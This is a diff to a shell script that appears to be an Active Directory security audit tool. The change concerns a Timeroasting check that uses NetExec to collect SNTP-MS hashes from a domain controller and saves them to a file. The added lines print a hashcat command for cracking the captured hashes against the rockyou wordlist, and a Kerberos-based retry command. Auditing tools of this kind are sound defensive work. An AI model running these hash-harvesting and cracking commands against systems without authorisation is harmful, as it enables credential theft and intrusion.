@@ -523,9 +523,14 @@ fi
 # Timeroasting Check
 TIMEROAST_OUTPUT=$(timeout 60 nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -M timeroast -o RIDS=500-5000 2>/dev/null)
 TIMEROAST_HASHES=$(echo "$TIMEROAST_OUTPUT" | grep -c '\$sntp-ms\$')
+
 if [ "$TIMEROAST_HASHES" -gt 0 ]; then
-  echo -e "${RED}[KO] $TIMEROAST_HASHES Timeroastable account(s) found${NC}"
+  echo -e "${RED}[KO] $TIMEROAST_HASHES Timeroastable account(s) found → timeroast.txt${NC}"
   echo "$TIMEROAST_OUTPUT" | grep '\$sntp-ms\$' > "$OUTPUT_DIR/timeroast.txt"
+  echo -e "${GREY}       └─ hashcat -m 31300 '$OUTPUT_DIR/timeroast.txt' /usr/share/wordlists/rockyou.txt${NC}"
+elif echo "$TIMEROAST_OUTPUT" | grep -qE "STATUS_NOT_SUPPORTED|NTLM.*disabled|Kerberos"; then
+  echo -e "${GREY}[--] Timeroasting skipped: NTLM disabled${NC}"
+  echo -e "${GREY}       └─ Use Kerberos auth: nxc smb $DC_FQDN -u '$USERNAME' -p '$PASSWORD' -k -M timeroast${NC}"
 else
   echo -e "${GREEN}[OK] No Timeroastable accounts found${NC}"
 fi
